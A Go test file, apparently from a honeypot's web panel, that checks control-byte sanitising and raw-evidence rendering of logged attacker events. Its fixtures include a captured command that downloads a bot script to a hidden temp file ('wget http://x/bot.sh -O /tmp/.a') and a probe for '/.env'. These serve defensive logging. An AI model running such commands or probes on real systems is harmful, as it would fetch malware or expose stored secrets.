package web

import (
	"strings"
	"testing"

	"github.com/k0braintheworld/k0pot/internal/model"
)

// Un escaner no siempre habla el protocolo del puerto: un "cliente SSH"
// puede ser en realidad un saludo RDP con bytes crudos. Volcarlos rompe el
// render. Paso de verdad: se vio "se identifica como MOJIBAKE" en el panel.
func TestVisibleEscapaLosBytesDeControl(t *testing.T) {
	casos := map[string]string{
		"uname -a":                       "uname -a",
		"\x00\x1b/*":                     `\x00\x1b/*`,
		"Cookie: mstshash=Administr\xe0": "Cookie: mstshash=Administr\xef\xbf\xbd", // e0 suelto no es UTF-8
		"linea1\nlinea2":                 "linea1\nlinea2",                         // los saltos reales se respetan
	}
	for entrada, quiero := range casos {
		got := visible(entrada)
		// El e0 suelto llega como caracter de reemplazo y se escapa a \x??
		if strings.Contains(entrada, "\xe0") {
			if !strings.Contains(got, `\x??`) {
				t.Errorf("%q: no se marco el byte invalido: %q", entrada, got)
			}
			continue
		}
		if got != quiero {
			t.Errorf("visible(%q) = %q, se esperaba %q", entrada, got, quiero)
		}
	}
}

// Ningun byte de control debe sobrevivir al saneado: es lo que garantiza
// que no llega basura al DOM.
func TestVisibleNoDejaBytesDeControl(t *testing.T) {
	sucio := "a\x00b\x07c\x1bd\x7fe"
	got := visible(sucio)
	for _, r := range got {
		if r < 0x20 && r != '\n' && r != '\r' {
			t.Errorf("quedo un byte de control 0x%02x en %q", r, got)
		}
	}
}

// El crudo es la prueba literal: para un comando debe ser el comando exacto.
func TestCrudoDeUnComando(t *testing.T) {
	ev := model.Evento{
		Tipo:    model.ComandoEjecutado,
		Detalle: map[string]string{"comando": "wget http://x/bot.sh -O /tmp/.a"},
	}
	if c := crudoDe(ev); c != "wget http://x/bot.sh -O /tmp/.a" {
		t.Errorf("crudo = %q", c)
	}
}

// Una conexion a secas no tiene contenido literal que ensenar.
func TestUnaConexionNoTieneCrudo(t *testing.T) {
	ev := model.Evento{Tipo: model.Conexion, Detalle: map[string]string{"puerto": "2222"}}
	if c := crudoDe(ev); c != "" {
		t.Errorf("una conexion no deberia tener crudo, dio %q", c)
	}
}

// El crudo de una peticion HTTP junta metodo, ruta y user-agent.
func TestCrudoDeUnaPeticionHTTP(t *testing.T) {
	ev := model.Evento{
		Tipo: model.PeticionHTTP,
		Detalle: map[string]string{
			"metodo": "GET", "ruta": "/.env", "cliente": "curl/8.1",
		},
	}
	c := crudoDe(ev)
	if !strings.Contains(c, "GET /.env") || !strings.Contains(c, "curl/8.1") {
		t.Errorf("crudo incompleto: %q", c)
	}
}
